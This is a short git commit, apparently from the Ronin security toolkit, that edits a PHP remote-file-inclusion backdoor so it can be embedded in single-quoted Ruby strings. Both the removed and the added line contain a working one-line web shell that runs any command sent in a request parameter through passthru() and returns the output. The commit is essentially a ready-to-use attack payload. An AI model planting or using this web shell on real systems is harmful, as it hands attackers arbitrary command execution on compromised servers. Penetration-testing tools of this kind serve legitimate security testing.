af494b72ae94dbe4be5dfa67e3b053929d207d85
postmodern <postmodern.mod3@gmail.com>
2010-03-12 16:39:27 -0800

    Use double-quotes so the backdoor can easily be included in single quoted Ruby strings.

--- static/ronin/php/rfi/backdoor.php
+++ static/ronin/php/rfi/backdoor.php
@@ -1,1 +1,1 @@
-<?php if(isset($_REQUEST['command'])){echo "<output>";passthru($_REQUEST['command']);echo "</output>";} ?>
+<?php if(isset($_REQUEST["command"])){echo "<output>";passthru($_REQUEST["command"]);echo "</output>";} ?>
